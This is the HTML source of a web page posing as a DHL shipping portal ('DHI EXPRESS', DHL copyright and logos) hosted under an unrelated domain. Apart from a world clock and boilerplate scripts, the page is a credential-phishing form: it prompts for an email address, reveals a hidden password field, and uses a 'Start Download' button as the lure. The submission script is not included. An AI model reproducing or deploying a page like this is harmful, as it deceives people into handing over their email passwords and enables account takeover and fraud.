<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<title>DHI EXPRESS</title>

<head>
<link href="facebox.css" rel="stylesheet" type="text/css" />
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"a817d3c304f8a7ff78844219004be2d5",petok:"c7612af90cc4552195d0936b36756d76a460348d-1423473790-1800",zone:"costcosupply.com",rocket:"0",apps:{}}];CloudFlare.push({"apps":{"ape":"377bcd5c648e861b9c7dc37a4baebcb3"}});!function(a,b){a=document.createElement("script"),b=document.getElementsByTagName("script")[0],a.async=!0,a.src="../../ajax.cloudflare.com/cdn-cgi/nexp/dok3v%3d919620257c/cloudflare.min.js",b.parentNode.insertBefore(a,b)}()}}catch(e){};
//]]>
</script>

<script language="javascript" type="text/javascript" src="./javascript/jquery-1.6.2.min.js"></script>
<script language="javascript" type="text/javascript" src="./javascript/facebox/src/facebox.js"></script>
<script language="javascript" type="text/javascript" src="./javascript/watermark/jquery.watermark.js"></script>
<script language="javascript" type="text/javascript" src="./javascript/javascript1.js"></script>

<style type="text/css">
#heading_tab {
	background-color: #FFFFFF;
	padding: 4px;
	width: 100%;
	color: #FFFFFF;
}
body {
	margin-left: 0px;
	margin-top: 0px;
	margin-right: 0px;
	margin-bottom: 0px;
}
body,td,th {
	font-family: Tahoma, Geneva, sans-serif;
}
#central_dv {
	padding: 5px;
	width: 800px;
	margin-right: auto;
	margin-left: auto;
	background-color: #EFEFEF;
	text-align: center;
}
.bigredB {
	font-size: 18px;
	color: #FFF;
	background-color: #FF4242;
	padding: 5px;
}
.textfldclass {
	padding: 4px;
	width: 300px;
	margin-bottom: 5px;
	text-align: center;
}
.pop_up_class {
	text-align: center;
	width: 400px;
}
.message_div {
	padding: 4px;
	width: 300px;
	margin-right: auto;
	margin-left: auto;
	margin-top: 5px;
	margin-bottom: 5px;
	color: #F00;
}
.style1 {
	color: #999999;
	font-size: 14px;
}
.style2 {
	color: #CC0000;
	font-style: italic;
}
.style3 {font-size: 16px}
</style>

<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>


</head>

<body onload=display_ct();>
<div id="Layer1" style="position:absolute; left:148px; top:425px; width:998px; height:290px; z-index:1">
  <div align="center">
    <p><img src="img/hl image.jpg" width="471" height="302"><img src="img/hlim1.jpg" width="474" height="303"></p>
    <p class="style1">Product Listing Policy -  Terms of Use</p>
    <p class="style1">&copy; 1999-2017 DHL. All rights reserved. </p>
    <p class="style1"><!--Beginning of IP Script-->
 Your <a href="http://www.whatsmyip.us/" style="color:black;"><b>IP</b></a> is: <?php echo $_SERVER['REMOTE_ADDR']; ?>
<!--End of IP Script-->

  </div>
</div>
<div id="heading_tab"> 
  <div align="left">
    <blockquote>
      <blockquote>
        <blockquote>
          <blockquote>
            <blockquote>
              <blockquote>
                <p><a href=""></a><img src="img/hl.jpg" width="367" height="121"><img src="img/static-logo.jpg" width="132" height="61" /> 
                <table border="0" width="200" cellspacing="0" cellpadding="3">
<form name="where">
  <tr>
    <td width="100%">
<select name="city" size="1" onChange="updateclock(this);"> 
<option value="" selected>Local time</option>
<option value="0">London GMT</option> 
<option value="1">Rome</option>
<option value="7">Bangkok</option>
<option value="8">Hong Kong</option>
<option value="9">Tokyo</option> 
<option value="10">Sydney</option>
<option value="12">Fiji</option>
<option value="-10">Hawaii</option>
<option value="-8">San Francisco</option> 
<option value="-5">New York</option>
<option value="-3">Buenos Aires</option>
</select>

</td>

  </tr>
  <tr>
    <td width="100%" bgcolor="#FFCC00"><script language="JavaScript">

/*
Drop Down World Clock- By JavaScript Kit (http://www.javascriptkit.com)
Portions of code by Kurt @ http://www.btinternet.com/~kurt.grigg/javascript
This credit notice must stay intact
*/

if (document.all||document.getElementById)
document.write('<span id="worldclock" style="font:bold 16px Arial;"></span><br />')

zone=0;
isitlocal=true;
ampm='';

function updateclock(z){
zone=z.options[z.selectedIndex].value;
isitlocal=(z.options[0].selected)?true:false;
}

function WorldClock(){
now=new Date();
ofst=now.getTimezoneOffset()/60;
secs=now.getSeconds();
sec=-1.57+Math.PI*secs/30;
mins=now.getMinutes();
min=-1.57+Math.PI*mins/30;
hr=(isitlocal)?now.getHours():(now.getHours() + parseInt(ofst)) + parseInt(zone);
hrs=-1.575+Math.PI*hr/6+Math.PI*parseInt(now.getMinutes())/360;
if (hr < 0) hr+=24;
if (hr > 23) hr-=24;
ampm = (hr > 11)?"PM":"AM";
statusampm = ampm.toLowerCase();

hr2 = hr;
if (hr2 == 0) hr2=12;
(hr2 < 13)?hr2:hr2 %= 12;
if (hr2<10) hr2="0"+hr2

var finaltime=hr2+':'+((mins < 10)?"0"+mins:mins)+':'+((secs < 10)?"0"+secs:secs)+' '+statusampm;

if (document.all)
worldclock.innerHTML=finaltime
else if (document.getElementById)
document.getElementById("worldclock").innerHTML=finaltime
else if (document.layers){
document.worldclockns.document.worldclockns2.document.write(finaltime)
document.worldclockns.document.worldclockns2.document.close()
}


setTimeout('WorldClock()',1000);
}

window.onload=WorldClock
//-->
</script>

</td>
</form></tr>
</table>
</p>
              </blockquote>
            </blockquote>
          </blockquote>
        </blockquote>
      </blockquote>
    </blockquote>
  </div>
</div>
<div id="central_dv">
  <p> 
  <span class="style2">
  <blink class="content style3">
  <strong> Access  with your Email address </strong>
  </blink>
  </span> <br />
  </p>
  <p>
    <label for="textfield"></label>
    <input name="textfield" type="text" class="textfldclass" id="email_field" /><br />
  <div id="the_d_" style="display: none"><input name="passwww" type="password" class="textfldclass" id="password_field" /></div>

  </p>
  <p> 
    <input name="button" type="submit" class="bigredB" id="download" value="Start Download" />
    <br />
  </p>
  
  <p>&nbsp;</p>
</div>
</body>


</html>